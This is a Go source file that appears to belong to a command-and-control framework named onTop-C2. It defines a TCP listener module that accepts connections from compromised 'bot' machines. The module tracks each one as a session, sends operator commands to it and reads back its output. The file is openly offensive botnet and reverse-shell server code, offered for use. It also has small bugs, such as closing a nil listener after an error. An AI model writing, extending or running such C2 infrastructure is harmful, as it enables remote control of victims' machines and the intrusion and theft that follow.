package chambers

import (
	// Built-in imports
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"sync"

	// Internal imports
	"github.com/Yyax13/onTop-C2/src/misc"
	"github.com/Yyax13/onTop-C2/src/types"
)

type MarauderInferi struct {
	ID 			string
	BotIP		string
	Connection  net.Conn
	Commands 	chan string
	Outputs 	chan string

}

var Inferis = make(map[string]*MarauderInferi)
func ipHandler(ip string, channel chan net.Conn) {
	misc.SysLog(fmt.Sprintf("Starting new handler for %v", ip), true)
	for conn := range channel {
		misc.SysLog(fmt.Sprintf("New connection from IP %v", ip), true)
		newSession := &MarauderInferi{
			ID: fmt.Sprintf("inferi-%d", rand.Intn(90000) + 10000), // I think that i should verify for collisions :3
			BotIP: ip,
			Connection: conn,
			Commands: make(chan string),
			Outputs: make(chan string),

		}
		
		Inferis[newSession.ID] = newSession
		misc.SysLog(fmt.Sprint("INFERI ID: ", newSession.ID, "\r\n"), true)

		go sessionHandler(newSession)

	}

}

func sessionHandler(sess *MarauderInferi) {
	reader := bufio.NewReader(sess.Connection)
	writer := bufio.NewWriter(sess.Connection)
	
	go func() {
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				misc.PanicWarn(fmt.Sprintf("Some error ocurred in %s handler: %v", sess.ID, err), true)
				break

			}
			sess.Outputs <- line

		}

	}()

	for commandByUser := range sess.Commands{
		_, err := writer.WriteString(commandByUser + "\n")
		if err != nil {
			break
		
		}
		
		writer.Flush()

	}

	

}

var ListenerOptions map[string]*types.Rune = map[string]*types.Rune{
	"PORTKEY": {
		Name: "PORTKEY",
		Description: "The port to listen", // need to increase this desc
		Required: true,
		Value: nil,

	},

}

var marauder types.Chamber = types.Chamber{
	Name: "marauder",
	Description: "Listen to TCP connections in the portkey, specified in runes",
	Parallel: true,
	Runes: ListenerOptions,
	Execute: StartListener,

}

func StartListener(opt map[string]*types.Rune) {
	portOption, ok := opt["PORTKEY"]
	if !ok {
		misc.PanicWarn("The 'PORTKEY' rune is unset", true)
		return

	}

	port, err := misc.AnyToInt(portOption.Value)
	if err != nil {
		misc.PanicWarn("The 'PORTKEY' rune value isn't a number\n", true)
		return

	}

	if !(port > 1024 && port < 65535) {
		misc.PanicWarn("The 'PORTKEY' rune value isn't valid, it must be between 1024 and 65535\n", true)
		return

	}

	marauder, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		misc.PanicWarn(fmt.Sprintf("Some error ocurred: %v", err.Error()), true)
		marauder.Close()

	}

	defer marauder.Close()
	misc.SysLog(fmt.Sprintf("Listening in the portkey %d...\n", port), true)

	ipClientChannel := make(map[string]chan net.Conn)
	var mu sync.Mutex

	for {
		conn, err := marauder.Accept()
		if err != nil {
			misc.PanicWarn(fmt.Sprintln("Some error ocurred during connection:", err), true)
			continue

		}

		mu.Lock()
		connIP := misc.ScrapIP(conn.RemoteAddr().String())
		ch, alreadyExists := ipClientChannel[connIP]
		if !alreadyExists {
			ch = make(chan net.Conn, 100)
			ipClientChannel[connIP] = ch

			go ipHandler(connIP, ch)			

		}

		mu.Unlock()
		ch <- conn
		
	}

}

func init() {
	RegisterNewModule(&marauder)

}
